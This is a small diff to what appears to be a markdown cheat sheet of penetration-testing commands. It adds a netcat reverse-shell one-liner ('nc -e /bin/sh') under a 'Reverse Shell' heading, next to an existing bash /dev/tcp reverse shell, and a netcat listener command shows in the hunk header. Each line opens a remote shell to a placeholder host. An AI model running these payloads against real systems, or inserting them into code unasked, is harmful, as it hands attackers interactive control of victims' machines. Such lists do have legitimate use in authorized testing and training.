@@ -765,6 +765,7 @@ nc -lcnp {PORT}
 
 ### Reverse Shell
 ```
+nc -e /bin/sh {IP} {PORT}
 bash -i >& /dev/tcp/{IP}/{PORT} 0>&1
 ```
 
